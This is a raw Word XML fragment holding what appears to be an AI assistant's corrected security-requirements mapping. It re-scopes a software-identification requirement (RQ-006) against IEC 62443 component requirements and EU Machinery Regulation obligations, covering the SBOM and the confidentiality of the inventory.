        </w:rPr>
        <w:t>identify the software/data</w:t>
      </w:r>
      <w:r w:rsidRPr="00CB35D8">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve"> handled by </w:t>
      </w:r>
      <w:r w:rsidRPr="00CB35D8">
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>RQ-004</w:t>
      </w:r>
      <w:r w:rsidRPr="00CB35D8">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2CC3F38B" w14:textId="77777777" w:rsidR="00D04F61" w:rsidRPr="00CB35D8" w:rsidRDefault="00D04F61" w:rsidP="00D04F61">
      <w:pPr>
        <w:pStyle w:val="KeinLeerraum"/>
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00CB35D8">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve">Would you like me to (a) re-check </w:t>
      </w:r>
      <w:r w:rsidRPr="00CB35D8">
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>RQ-006</w:t>
      </w:r>
      <w:r w:rsidRPr="00CB35D8">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve"> for the same identity-integrity/MITM realignment (it reused that material), (b) re-check </w:t>
      </w:r>
      <w:r w:rsidRPr="00CB35D8">
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>RQ-011</w:t>
      </w:r>
      <w:r w:rsidRPr="00CB35D8">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve"> to confirm it now correctly </w:t>
      </w:r>
      <w:r w:rsidRPr="00CB35D8">
        <w:rPr>
          <w:i/>
          <w:iCs/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>receives</w:t>
      </w:r>
      <w:r w:rsidRPr="00CB35D8">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve"> the update-authorization gate + </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00CB35D8">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>EoP</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00CB35D8">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>, or (c) proceed to consolidation of the corrected set?</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="20A91185" w14:textId="151AA070" w:rsidR="00B84B53" w:rsidRDefault="00B84B53" w:rsidP="00B84B53">
      <w:pPr>
        <w:pStyle w:val="KeinLeerraum"/>
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="025B7F5F" w14:textId="77777777" w:rsidR="00960153" w:rsidRDefault="00960153" w:rsidP="00B84B53">
      <w:pPr>
        <w:pStyle w:val="KeinLeerraum"/>
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="1A65AD38" w14:textId="77777777" w:rsidR="00960153" w:rsidRDefault="00960153" w:rsidP="00B84B53">
      <w:pPr>
        <w:pStyle w:val="KeinLeerraum"/>
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="705FE2E6" w14:textId="77777777" w:rsidR="00960153" w:rsidRDefault="00960153" w:rsidP="00B84B53">
      <w:pPr>
        <w:pStyle w:val="KeinLeerraum"/>
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="286DD3EA" w14:textId="0C108427" w:rsidR="00960153" w:rsidRPr="00C1714F" w:rsidRDefault="00960153" w:rsidP="00960153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t xml:space="preserve">REQUIREMENT </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:u w:val="double"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>6</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="27F2CB4B" w14:textId="77777777" w:rsidR="00960153" w:rsidRPr="006F109C" w:rsidRDefault="00960153" w:rsidP="00B84B53">
      <w:pPr>
        <w:pStyle w:val="KeinLeerraum"/>
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="59A1BB15" w14:textId="77777777" w:rsidR="00960153" w:rsidRDefault="00960153" w:rsidP="006F109C">
      <w:pPr>
        <w:pStyle w:val="KeinLeerraum"/>
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="6C5ADF31" w14:textId="77777777" w:rsidR="005B4077" w:rsidRPr="00297A8B" w:rsidRDefault="005B4077" w:rsidP="005B4077">
      <w:pPr>
        <w:pStyle w:val="KeinLeerraum"/>
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00297A8B">
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>RQ-006 — Reprocessed (Scope-Corrected)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="75314D83" w14:textId="77777777" w:rsidR="005B4077" w:rsidRPr="00297A8B" w:rsidRDefault="005B4077" w:rsidP="005B4077">
      <w:pPr>
        <w:pStyle w:val="KeinLeerraum"/>
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00297A8B">
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>Correction applied:</w:t>
      </w:r>
      <w:r w:rsidRPr="00297A8B">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve"> RQ-006 reused RQ-004's identity-integrity material, so it inherits the </w:t>
      </w:r>
      <w:r w:rsidRPr="00297A8B">
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>same over-reach I just corrected in RQ-004</w:t>
      </w:r>
      <w:r w:rsidRPr="00297A8B">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7F779E63" w14:textId="77777777" w:rsidR="005B4077" w:rsidRPr="00297A8B" w:rsidRDefault="005B4077">
      <w:pPr>
        <w:pStyle w:val="KeinLeerraum"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="25"/>
        </w:numPr>
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00297A8B">
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>Identity-integrity / MITM over-reach.</w:t>
      </w:r>
      <w:r w:rsidRPr="00297A8B">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve"> My original RQ-006 mapped </w:t>
      </w:r>
      <w:r w:rsidRPr="00297A8B">
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>CR 3.4 (inventory integrity)</w:t>
      </w:r>
      <w:r w:rsidRPr="00297A8B">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve">, added a </w:t>
      </w:r>
      <w:r w:rsidRPr="00297A8B">
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>Spoofing/Tampering-of-inventory</w:t>
      </w:r>
      <w:r w:rsidRPr="00297A8B">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve"> primary threat, brought in </w:t>
      </w:r>
      <w:r w:rsidRPr="00297A8B">
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>Asset F</w:t>
      </w:r>
      <w:r w:rsidRPr="00297A8B">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve">, and reused </w:t>
      </w:r>
      <w:r w:rsidRPr="00297A8B">
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>TC-RQ004-04 (MITM falsification)</w:t>
      </w:r>
      <w:r w:rsidRPr="00297A8B">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve"> as its G-3 proof. </w:t>
      </w:r>
      <w:r w:rsidRPr="00297A8B">
        <w:rPr>
          <w:i/>
          <w:iCs/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>Protecting</w:t>
      </w:r>
      <w:r w:rsidRPr="00297A8B">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve"> the inventory against falsification is the substance of </w:t>
      </w:r>
      <w:r w:rsidRPr="00297A8B">
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>RQ-005</w:t>
      </w:r>
      <w:r w:rsidRPr="00297A8B">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve"> ("protect identified software and data against corruption"). RQ-006 is a pure </w:t>
      </w:r>
      <w:r w:rsidRPr="00297A8B">
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>identify</w:t>
      </w:r>
      <w:r w:rsidRPr="00297A8B">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve"> requirement. All of this is </w:t>
      </w:r>
      <w:r w:rsidRPr="00297A8B">
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>demoted to a cross-reference to RQ-005</w:t>
      </w:r>
      <w:r w:rsidRPr="00297A8B">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2B042949" w14:textId="77777777" w:rsidR="005B4077" w:rsidRPr="005B4077" w:rsidRDefault="005B4077">
      <w:pPr>
        <w:pStyle w:val="KeinLeerraum"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="25"/>
        </w:numPr>
      </w:pPr>
      <w:r w:rsidRPr="00297A8B">
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>Scope clarity (a strength to keep).</w:t>
      </w:r>
      <w:r w:rsidRPr="00297A8B">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve"> RQ-006 is </w:t>
      </w:r>
      <w:r w:rsidRPr="00297A8B">
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>software-only</w:t>
      </w:r>
      <w:r w:rsidRPr="00297A8B">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve"> (it drops RQ-004's "data" limb), so — unlike RQ-004 — </w:t>
      </w:r>
      <w:r w:rsidRPr="00297A8B">
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>CR 7.8 alone genuinely suffices</w:t>
      </w:r>
      <w:r w:rsidRPr="00297A8B">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve"> as primary, and there is </w:t>
      </w:r>
      <w:r w:rsidRPr="00297A8B">
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>no I&amp;M4 data-fingerprint</w:t>
      </w:r>
      <w:r w:rsidRPr="00297A8B">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve"> concern here. </w:t>
      </w:r>
      <w:r w:rsidRPr="005B4077">
        <w:t xml:space="preserve">This </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="005B4077">
        <w:t>distinction</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="005B4077">
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="005B4077">
        <w:t>should</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="005B4077">
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="005B4077">
        <w:t>be</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="005B4077">
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="005B4077">
        <w:t>stated</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="005B4077">
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="005B4077">
        <w:t>explicitly</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="005B4077">
        <w:t>.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="59B0AFF5" w14:textId="77777777" w:rsidR="005B4077" w:rsidRPr="00297A8B" w:rsidRDefault="005B4077" w:rsidP="005B4077">
      <w:pPr>
        <w:pStyle w:val="KeinLeerraum"/>
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00297A8B">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve">What survives is the tight, correct RQ-006 core: </w:t>
      </w:r>
      <w:r w:rsidRPr="00297A8B">
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>identify the installed software necessary for safe operation (completeness, incl. the SBOM gap) + keep that identification confidential.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6A5B2D0F" w14:textId="77777777" w:rsidR="005B4077" w:rsidRPr="005B4077" w:rsidRDefault="005B4077" w:rsidP="005B4077">
      <w:pPr>
        <w:pStyle w:val="KeinLeerraum"/>
      </w:pPr>
      <w:r w:rsidRPr="005B4077">
        <w:pict w14:anchorId="2D1072D3">
          <v:rect id="_x0000_i1415" style="width:0;height:1.5pt" o:hralign="center" o:hrstd="t" o:hr="t" fillcolor="#a0a0a0" stroked="f"/>
        </w:pict>
      </w:r>
    </w:p>
    <w:p w14:paraId="46DC773C" w14:textId="77777777" w:rsidR="005B4077" w:rsidRPr="00297A8B" w:rsidRDefault="005B4077" w:rsidP="005B4077">
      <w:pPr>
        <w:pStyle w:val="KeinLeerraum"/>
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00297A8B">
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>Step 1 — Critical Review &amp; Theoretical Validation</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="12D70A06" w14:textId="77777777" w:rsidR="005B4077" w:rsidRPr="00297A8B" w:rsidRDefault="005B4077" w:rsidP="005B4077">
      <w:pPr>
        <w:pStyle w:val="KeinLeerraum"/>
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00297A8B">
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>1.1 Requirement &amp; CR Mapping</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5EA837C2" w14:textId="77777777" w:rsidR="005B4077" w:rsidRPr="00297A8B" w:rsidRDefault="005B4077" w:rsidP="005B4077">
      <w:pPr>
        <w:pStyle w:val="KeinLeerraum"/>
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00297A8B">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve">EU Machinery Regulation identification obligation, scoped to </w:t>
      </w:r>
      <w:r w:rsidRPr="00297A8B">
        <w:rPr>
          <w:i/>
          <w:iCs/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>installed software necessary for safe operation</w:t>
      </w:r>
      <w:r w:rsidRPr="00297A8B">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve"> — the </w:t>
      </w:r>
      <w:r w:rsidRPr="00297A8B">
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>software inventory</w:t>
      </w:r>
      <w:r w:rsidRPr="00297A8B">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve"> requirement in its purest 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893"/>
        <w:gridCol w:w="2284"/>
        <w:gridCol w:w="3861"/>
      </w:tblGrid>
      <w:tr w:rsidR="005B4077" w:rsidRPr="005B4077" w14:paraId="789B62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6FF46D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00E977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proofErr w:type="spellStart"/>
            <w:r w:rsidRPr="005B4077">
              <w:rPr>
                <w:b/>
                <w:bCs/>
              </w:rPr>
              <w:t>Your</w:t>
            </w:r>
            <w:proofErr w:type="spellEnd"/>
            <w:r w:rsidRPr="005B4077">
              <w:rPr>
                <w:b/>
                <w:bCs/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:proofErr w:type="spellStart"/>
            <w:r w:rsidRPr="005B4077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095B69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proofErr w:type="spellStart"/>
            <w:r w:rsidRPr="005B4077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04BB89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proofErr w:type="spellStart"/>
            <w:r w:rsidRPr="005B4077">
              <w:rPr>
                <w:b/>
                <w:bCs/>
              </w:rPr>
              <w:t>Correction</w:t>
            </w:r>
            <w:proofErr w:type="spellEnd"/>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w:rsidR="005B4077" w:rsidRPr="005B4077" w14:paraId="2D84D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6A3D2" w14:textId="77777777" w:rsidR="005B4077" w:rsidRPr="005B4077" w:rsidRDefault="005B4077" w:rsidP="005B4077">
            <w:pPr>
              <w:pStyle w:val="KeinLeerraum"/>
            </w:pPr>
            <w:r w:rsidRPr="005B4077">
              <w:t xml:space="preserve">CR 7.8 – </w:t>
            </w:r>
            <w:proofErr w:type="spellStart"/>
            <w:r w:rsidRPr="005B4077">
              <w:t>Component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inventory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7A1B5" w14:textId="77777777" w:rsidR="005B4077" w:rsidRPr="005B4077" w:rsidRDefault="005B4077" w:rsidP="005B4077">
            <w:pPr>
              <w:pStyle w:val="KeinLeerraum"/>
            </w:pPr>
            <w:r w:rsidRPr="005B40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35E51" w14:textId="77777777" w:rsidR="005B4077" w:rsidRPr="00297A8B" w:rsidRDefault="005B4077" w:rsidP="005B4077">
            <w:pPr>
              <w:pStyle w:val="KeinLeerraum"/>
              <w:rPr>
                <w:lang w:val="en-US"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="00297A8B">
              <w:rPr>
                <w:b/>
                <w:bCs/>
                <w:lang w:val="en-US"/>
              </w:rPr>
              <w:t>Correct — and, unlike RQ-004, sufficient as sole primary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620CC" w14:textId="77777777" w:rsidR="005B4077" w:rsidRPr="005B4077" w:rsidRDefault="005B4077" w:rsidP="005B4077">
            <w:pPr>
              <w:pStyle w:val="KeinLeerraum"/>
            </w:pPr>
            <w:r w:rsidRPr="00297A8B">
              <w:rPr>
                <w:lang w:val="en-US"/>
              </w:rPr>
              <w:t xml:space="preserve">Because RQ-006 excludes "data," CR 7.8 alone carries the requirement. </w:t>
            </w:r>
            <w:r w:rsidRPr="005B4077">
              <w:t xml:space="preserve">Modern CR 7.8 = </w:t>
            </w:r>
            <w:r w:rsidRPr="005B4077">
              <w:rPr>
                <w:b/>
                <w:bCs/>
              </w:rPr>
              <w:t>SBOM-grade</w:t>
            </w:r>
            <w:r w:rsidRPr="005B4077">
              <w:t xml:space="preserve"> → </w:t>
            </w:r>
            <w:proofErr w:type="spellStart"/>
            <w:r w:rsidRPr="005B4077">
              <w:t>drives</w:t>
            </w:r>
            <w:proofErr w:type="spellEnd"/>
            <w:r w:rsidRPr="005B4077">
              <w:t xml:space="preserve"> G-1.</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w:rsidR="005B4077" w:rsidRPr="005B4077" w14:paraId="419AF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7CADF" w14:textId="77777777" w:rsidR="005B4077" w:rsidRPr="005B4077" w:rsidRDefault="005B4077" w:rsidP="005B4077">
            <w:pPr>
              <w:pStyle w:val="KeinLeerraum"/>
            </w:pPr>
            <w:r w:rsidRPr="005B4077">
              <w:t xml:space="preserve">CR 4.1 – </w:t>
            </w:r>
            <w:proofErr w:type="spellStart"/>
            <w:r w:rsidRPr="005B4077">
              <w:t>Confidentiality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of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information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EB53D" w14:textId="77777777" w:rsidR="005B4077" w:rsidRPr="005B4077" w:rsidRDefault="005B4077" w:rsidP="005B4077">
            <w:pPr>
              <w:pStyle w:val="KeinLeerraum"/>
            </w:pPr>
            <w:r w:rsidRPr="005B4077">
              <w:rPr>
                <w:rFonts w:ascii="Segoe UI Emoji" w:hAnsi="Segoe UI Emoji" w:cs="Segoe UI Emoji"/>
              </w:rPr>
              <w:t>✅</w:t>
            </w:r>
            <w:r w:rsidRPr="005B4077">
              <w:t xml:space="preserve"> (in </w:t>
            </w:r>
            <w:proofErr w:type="spellStart"/>
            <w:r w:rsidRPr="005B4077">
              <w:t>your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gap</w:t>
            </w:r>
            <w:proofErr w:type="spellEnd"/>
            <w:r w:rsidRPr="005B407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BB209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9EB0C" w14:textId="77777777" w:rsidR="005B4077" w:rsidRPr="005B4077" w:rsidRDefault="005B4077" w:rsidP="005B4077">
            <w:pPr>
              <w:pStyle w:val="KeinLeerraum"/>
            </w:pPr>
            <w:r w:rsidRPr="00297A8B">
              <w:rPr>
                <w:b/>
                <w:bCs/>
                <w:lang w:val="en-US"/>
              </w:rPr>
              <w:t>Add to the mapping</w:t>
            </w:r>
            <w:r w:rsidRPr="00297A8B">
              <w:rPr>
                <w:lang w:val="en-US"/>
              </w:rPr>
              <w:t xml:space="preserve"> (your confidentiality point had no CR anchor). </w:t>
            </w:r>
            <w:r w:rsidRPr="005B4077">
              <w:t xml:space="preserve">Add </w:t>
            </w:r>
            <w:r w:rsidRPr="005B4077">
              <w:rPr>
                <w:b/>
                <w:bCs/>
              </w:rPr>
              <w:t>CR 4.3</w:t>
            </w:r>
            <w:r w:rsidRPr="005B4077">
              <w:t xml:space="preserve"> — </w:t>
            </w:r>
            <w:proofErr w:type="spellStart"/>
            <w:r w:rsidRPr="005B4077">
              <w:t>no</w:t>
            </w:r>
            <w:proofErr w:type="spellEnd"/>
            <w:r w:rsidRPr="005B4077">
              <w:t xml:space="preserve"> HTTPS (SRIO-7907).</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w:rsidR="005B4077" w:rsidRPr="00297A8B" w14:paraId="348CA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0A364" w14:textId="77777777" w:rsidR="005B4077" w:rsidRPr="005B4077" w:rsidRDefault="005B4077" w:rsidP="005B4077">
            <w:pPr>
              <w:pStyle w:val="KeinLeerraum"/>
            </w:pPr>
            <w:del w:id="17" w:author="Unknown">
              <w:r w:rsidRPr="005B4077">
                <w:delText xml:space="preserve">CR 3.4 – Inventory </w:delText>
              </w:r>
              <w:r w:rsidRPr="005B4077">
                <w:lastRenderedPageBreak/>
                <w:delText>integrity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91CC1" w14:textId="77777777" w:rsidR="005B4077" w:rsidRPr="005B4077" w:rsidRDefault="005B4077" w:rsidP="005B4077">
            <w:pPr>
              <w:pStyle w:val="KeinLeerraum"/>
            </w:pPr>
            <w:r w:rsidRPr="005B4077">
              <w:lastRenderedPageBreak/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0E179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rPr>
                <w:b/>
                <w:bCs/>
              </w:rPr>
              <w:t>Demoted</w:t>
            </w:r>
            <w:proofErr w:type="spellEnd"/>
            <w:r w:rsidRPr="005B4077">
              <w:rPr>
                <w:b/>
                <w:bCs/>
              </w:rPr>
              <w:t xml:space="preserve"> → RQ-005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68BC3" w14:textId="77777777" w:rsidR="005B4077" w:rsidRPr="00297A8B" w:rsidRDefault="005B4077" w:rsidP="005B4077">
            <w:pPr>
              <w:pStyle w:val="KeinLeerraum"/>
              <w:rPr>
                <w:lang w:val="en-US"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="00297A8B">
              <w:rPr>
                <w:i/>
                <w:iCs/>
                <w:lang w:val="en-US"/>
              </w:rPr>
              <w:t>Protecting</w:t>
            </w:r>
            <w:r w:rsidRPr="00297A8B">
              <w:rPr>
                <w:lang w:val="en-US"/>
              </w:rPr>
              <w:t xml:space="preserve"> the inventory against </w:t>
            </w:r>
            <w:r w:rsidRPr="00297A8B">
              <w:rPr>
                <w:lang w:val="en-US"/>
              </w:rPr>
              <w:lastRenderedPageBreak/>
              <w:t>falsification is RQ-005. Cross-referenced, not mapped here.</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w:rsidR="005B4077" w:rsidRPr="009B0AAA" w14:paraId="66696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FA8D6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lastRenderedPageBreak/>
              <w:t>IEC 62443-4-1 SM-9 / SM-10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CCD97" w14:textId="77777777" w:rsidR="005B4077" w:rsidRPr="005B4077" w:rsidRDefault="005B4077" w:rsidP="005B4077">
            <w:pPr>
              <w:pStyle w:val="KeinLeerraum"/>
            </w:pPr>
            <w:r w:rsidRPr="005B4077">
              <w:rPr>
                <w:rFonts w:ascii="Segoe UI Emoji" w:hAnsi="Segoe UI Emoji" w:cs="Segoe UI Emoji"/>
              </w:rPr>
              <w:t>➕</w:t>
            </w:r>
            <w:r w:rsidRPr="005B4077">
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:proofErr w:type="spellStart"/>
            <w:r w:rsidRPr="005B4077">
              <w:t>note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80E5E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t>Process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anchor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C175F" w14:textId="77777777" w:rsidR="005B4077" w:rsidRPr="009B0AAA" w:rsidRDefault="005B4077" w:rsidP="005B4077">
            <w:pPr>
              <w:pStyle w:val="KeinLeerraum"/>
              <w:rPr>
                <w:lang w:val="en-US"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="009B0AAA">
              <w:rPr>
                <w:lang w:val="en-US"/>
              </w:rPr>
              <w:t>SBOM/third-party-component obligation anchors here.</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
    </w:tbl>
    <w:p w14:paraId="75C6E005" w14:textId="77777777" w:rsidR="005B4077" w:rsidRPr="005B4077" w:rsidRDefault="005B4077" w:rsidP="005B4077">
      <w:pPr>
        <w:pStyle w:val="KeinLeerraum"/>
      </w:pPr>
      <w:r w:rsidRPr="009B0AAA">
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>Corrected mapping:</w:t>
      </w:r>
      <w:r w:rsidRPr="009B0AAA">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve"> RQ-006 → EHSR identification obligation (software) →</w:t>
      </w:r>
      <w:r w:rsidRPr="009B0AAA">
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>{CR 7.8 [inventory/SBOM — sole primary], CR 4.1 (+CR 4.3) [confidentiality]}</w:t>
      </w:r>
      <w:r w:rsidRPr="009B0AAA">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve">, with </w:t>
      </w:r>
      <w:r w:rsidRPr="009B0AAA">
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>4-1 SM-9/SM-10</w:t>
      </w:r>
      <w:r w:rsidRPr="009B0AAA">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve"> as the SBOM process anchor.</w:t>
      </w:r>
      <w:r w:rsidRPr="009B0AAA">
        <w:rPr>
          <w:i/>
          <w:iCs/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>(Integrity/authenticity of the inventory → RQ-005.)</w:t>
      </w:r>
      <w:r w:rsidRPr="009B0AAA">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:hyperlink r:id="rId134" w:history="1">
        <w:r w:rsidRPr="005B4077">
          <w:rPr>
            <w:rStyle w:val="Hyperlink"/>
          </w:rPr>
          <w:t xml:space="preserve">[IEC62443_4_2_source | </w:t>
        </w:r>
        <w:proofErr w:type="spellStart"/>
        <w:r w:rsidRPr="005B4077">
          <w:rPr>
            <w:rStyle w:val="Hyperlink"/>
          </w:rPr>
          <w:t>Txt</w:t>
        </w:r>
        <w:proofErr w:type="spellEnd"/>
        <w:r w:rsidRPr="005B4077">
          <w:rPr>
